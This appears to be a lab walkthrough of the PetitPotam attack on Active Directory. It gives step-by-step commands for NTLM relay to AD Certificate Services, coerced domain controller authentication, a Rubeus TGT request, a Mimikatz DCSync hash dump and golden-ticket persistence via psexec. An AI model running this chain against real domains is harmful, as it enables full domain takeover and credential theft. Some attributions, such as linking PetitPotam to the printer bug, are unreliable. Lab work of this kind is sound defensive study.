# Introduction & Attack Anatomy
- The **PetitPotam attack** is a technique where we abuse the **printer bug** to make a **domain controller** authenticate to our **kali machine**.
- *Relaying the captured authentication* to the **web interface of AD Certificate services (ADCS)** allows us to get the **certificate of the domain controller's computer account**.
- *Having this certificate* can let us **request a TGT for the computer account**.
- *With a TGT of a Domain Controller's machine account,* we can abuse its **DCSync** right on the domain to retrieve **a full dump containing all domain users' NTLM hashes**.
- *Having all user hashes and using them with a simple Pass-the-Hash attack,* we can obtain **code execution as a Domain Admin**.
- **Persistence** can also be established with a **golden ticket** since the `krbtgt` account hash would be obtainable.

# Lab Setup and Conditions
1. **DC.lab.local (192.168.126.129):** A Domain Controller with **Active Directory Certificate Services Web Enrollment** enabled
2. **DC2.lab.local (192.168.126.130):** Another Domain Controller (*PrintSpooler Service must be running to quickly force authentication.*)
3. **Kali Machine (192.168.126.132):** for triggering authentication and relaying to ADCS Web UI.
4. **Windows Machine (192.168.126.128):** for requesting a TGT and doing the DCSync attack (it shouldn't be in the domain, but should have the DC as its DNS server).
5. **Normal user account (Lab\JohnSmith):** A regular domain user with no special privileges.

# Tools needed
1. **Impacket** (https://github.com/SecureAuthCorp/impacket)
2. **PetitPotam** (https://github.com/topotam/PetitPotam)
3. **Rubeus** (https://github.com/GhostPack/Rubeus)
4. **Mimikatz** (https://github.com/gentilkiwi/mimikatz)

# Steps to Create
1. Set up NTLM Relay on our attacker host to forward the captured authentication to ADCS Web UI
2. Use PetitPotam to force authentication from a domain controller back to the relaying kali machine
3. Recieve the Base64 certificate for the domain controller's computer account
4. use Rubeus on the windows machine to request a TGT for that account using the certificate
5. *Having the TGT in memory,* use Mimikatz to do a DCSync attack
6. Grab any domain admin's hash to have code execution
7. (Optional) create a golden ticket for persistence


# Lab Setup and Conditions
## 1. DC.lab.local (192.168.126.129)
A Domain Controller with **Active Directory Certificate Services Web Enrollment** enabled

![Domain-Controllers](Domain-Controllers.jpg)

![AD-CS-Installed](AD-CS-Installed.jpg)

## 2. DC2.lab.local (192.168.126.130)
Another Domain Controller (*PrintSpooler Service must be running to quickly force authentication.*)

![Spooler-Running](Spooler-Running.jpg)

## 3. Kali Machine (192.168.126.132)
for triggering authentication and relaying to ADCS Web UI.

![kali-ip-config](kali-ip-config.jpg)

## 4. Windows Machine (192.168.126.128)
for requesting a TGT and doing the DCSync attack (it shouldn't be in the domain, but should have the DC as its DNS server).

![Windows-Attacker-ipconfig](Windows-Attacker-ipconfig.jpg)

## 5. normal user account (Lab\JohnSmith)
A regular domain user with no special privileges.

![John-Smith-User](John-Smith-User.jpg)


# Steps to Create
## 1. Set up NTLM Relay on our attacker host to forward the captured authentication to ADCS Web UI
`ntlmrelayx.py -t http://<CAServer>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`

![ntlm-relay-start](ntlm-relay-start.jpg)

## 2. Use PetitPotam to force authentication from a domain controller back to the relaying kali machine
`python3 PetitPotam.py -d <DOMAIN_FQDN> -u <USERNAME> -p <PASSWORD> <KALI> <TARGET_DC>`

![PetitPotam-Launched](PetitPotam-Launched.jpg)

## 3. Recieve the Base64 certificate for the domain controller's computer account

![got-dc2-cert](got-dc2-cert.jpg)

## 4. use Rubeus.exe on the windows machine to request a TGT for that account using the certificate

`.\Rubeus.exe asktgt /outfile:kirbi /dc:<DOMAINCONTROLLER> /domain:<DOMAIN_FQDN> /user:<CAPTURED_DC_COMPUTER_ACCOUNT_NAME> /ptt /certificate:<CAPTURED_BASE64_CERTIFICATE>`

![rubeus-command](rubeus-command.jpg)

![got-dc2-tgt](got-dc2-tgt.jpg)

## 5. *Having the TGT in memory,* use Mimikatz.exe to do a DCSync attack
`lsadump::dcsync /domain:<DOMAINFQDN> /user:<TARGET_USER>`

![dcsync-for-domain-admin-hash](dcsync-for-domain-admin-hash.jpg)

## 6. Grab any domain admin's hash to have code execution

![code-execution-as-administrator](code-execution-as-administrator.jpg)

## 7. (Optional) create a golden ticket for persistence
Domain SID Lookup: `lookupsid.py <DOMAIN_FQDN>/<USERNAME>@<DC_IP>`

![domain-sid-lookup](domain-sid-lookup.jpg)

Obtaining `krbtgt` hash: `lsadump::dcsync /domain:<DOMAIN_FQDN> /user:krbtgt`

![krbtgt-hash](krbtgt-hash.jpg)

Golden ticket creation: `ticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN_FQDN> <CAN_BE_NON_EXISTING_USERNAME>`

![golden-ticket-created](golden-ticket-created.jpg)

Exporting ticket to environment: `export KRB5CCNAME=/<CHOSEN_USERNAME>.ccache`

Command execution using ticket: `psexec.py <DOMAIN_FQDN>/<CHOSEN_USERNAME>@<DC_FQDN> -k -no-pass`

![golden-ticket-used](golden-ticket-used.jpg)

# Credits
1. **Will Schroeder** and **Lee Christensen** who wrote this excellent paper (https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
2. **Lionel Gilles** for creating the **PetitPotam** Python Script
3. **Yang Zhang** of Back2Zero team & **Yongtao Wang** (@Sanr) of BCM Social Corp, **Eyal Karni, Marina Simakov and Yaron Zinar** from Preempt & **n1nty** from A-TEAM of Legendsec at Qi'anxin Group for the **PrinterBug** (CVE-2019-1040)
4. **SecureAuthCorp** for the awesome **Impacket** scripts
5. **Benjamin Delpy** for the legendary **mimikatz**
6. **GhostPack** for the **Rubeus** tool